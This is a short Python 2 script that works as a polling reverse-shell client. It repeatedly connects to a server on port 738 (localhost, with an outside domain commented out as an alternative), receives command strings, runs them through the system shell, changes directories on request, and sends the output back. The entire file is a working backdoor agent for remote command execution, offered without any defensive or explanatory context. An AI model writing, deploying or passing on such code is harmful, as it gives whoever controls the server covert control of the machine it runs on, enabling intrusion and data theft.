import socket
import sys
from os import system,chdir
import commands
from time import sleep

HOST,PORT = "localhost", 738
#HOST,PORT = "batterystapler.com", 738

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
get = "get"
data = get
while True:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        sock.sendall(data + "\n")
        received = sock.recv(1024)
        if received == "\0":
            sleep(1)
            data = get
        else:
            first = received.split(" ")[0]
            if first == "cd":
                try:
                    chdir(" ".join(received.split(" ")[1:]))
                except OSError as ose:
                    print ose
                finally:
                    received = "pwd"
            result = commands.getstatusoutput(received)
            data = received + "\n" + str(result[0]) + "\n" + result[1]
            print data
    except socket.error as se:
        print se
        sleep(1)
    finally:
        sock.close()
        sleep(.1)
